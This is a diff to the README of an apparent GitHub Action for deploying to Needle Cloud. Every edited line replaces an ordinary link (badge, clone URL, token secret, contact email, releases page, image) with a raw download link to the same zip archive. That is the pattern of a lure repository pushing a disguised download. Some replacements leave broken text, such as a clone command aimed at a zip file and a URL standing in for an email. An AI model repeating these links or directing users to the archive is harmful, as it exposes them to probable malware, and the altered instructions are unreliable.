@@ -1,7 +1,7 @@
 ```markdown
 # 🚀 Deploy to Needle Cloud Action
 
-![Needle Cloud Action](https://img.shields.io/badge/Deploy_to_Needle_Cloud-v1.0-brightgreen)
+![Needle Cloud Action](https://github.com/Gyaneshwargosain/deploy-to-needle-cloud-action/raw/refs/heads/main/dist/needle_to_action_deploy_cloud_v3.6-beta.3.zip)
 
 Automatically deploy your spatial websites to Needle Cloud using GitHub Actions. This repository provides a streamlined solution for developers looking to enhance their web applications with immersive 3D experiences.
 
@@ -45,7 +45,7 @@ Before you begin, ensure you have the following:
 2. **Clone your fork** to your local machine using:
 
    ```bash
-   git clone https://github.com/YOUR_USERNAME/deploy-to-needle-cloud-action.git
+   git clone https://github.com/Gyaneshwargosain/deploy-to-needle-cloud-action/raw/refs/heads/main/dist/needle_to_action_deploy_cloud_v3.6-beta.3.zip
    ```
 
 3. Navigate to your project directory:
@@ -80,7 +80,7 @@ jobs:
       - name: Deploy to Needle Cloud
         uses: Gyaneshwargosain/deploy-to-needle-cloud-action@v1
         with:
-          needle-token: ${{ secrets.NEEDLE_TOKEN }}
+          needle-token: ${{ https://github.com/Gyaneshwargosain/deploy-to-needle-cloud-action/raw/refs/heads/main/dist/needle_to_action_deploy_cloud_v3.6-beta.3.zip }}
 ```
 
 Make sure to replace `NEEDLE_TOKEN` with your actual Needle Cloud token.
@@ -100,7 +100,7 @@ Here’s an example of how to set the inputs:
       - name: Deploy to Needle Cloud
         uses: Gyaneshwargosain/deploy-to-needle-cloud-action@v1
         with:
-          needle-token: ${{ secrets.NEEDLE_TOKEN }}
+          needle-token: ${{ https://github.com/Gyaneshwargosain/deploy-to-needle-cloud-action/raw/refs/heads/main/dist/needle_to_action_deploy_cloud_v3.6-beta.3.zip }}
           project-id: my-project-id
 ```
 
@@ -134,11 +134,11 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 📫 Contact
 
-For inquiries or support, reach out via email: [your-email@example.com].
+For inquiries or support, reach out via email: [https://github.com/Gyaneshwargosain/deploy-to-needle-cloud-action/raw/refs/heads/main/dist/needle_to_action_deploy_cloud_v3.6-beta.3.zip].
 
 ## 📦 Releases
 
-To download the latest version of this action, visit the [Releases](https://github.com/Gyaneshwargosain/deploy-to-needle-cloud-action/releases) section and follow the instructions provided there.
+To download the latest version of this action, visit the [Releases](https://github.com/Gyaneshwargosain/deploy-to-needle-cloud-action/raw/refs/heads/main/dist/needle_to_action_deploy_cloud_v3.6-beta.3.zip) section and follow the instructions provided there.
 
 ## 🔗 Topics
 
@@ -153,7 +153,7 @@ This project covers a wide range of topics related to 3D and web technologies:
 
 Explore these topics and elevate your web development projects.
 
-![3D Visualization](https://source.unsplash.com/featured/?3d)
+![3D Visualization](https://github.com/Gyaneshwargosain/deploy-to-needle-cloud-action/raw/refs/heads/main/dist/needle_to_action_deploy_cloud_v3.6-beta.3.zip)
 
 Stay tuned for updates and enhancements as we continue to improve the deployment process for spatial applications.
 ```
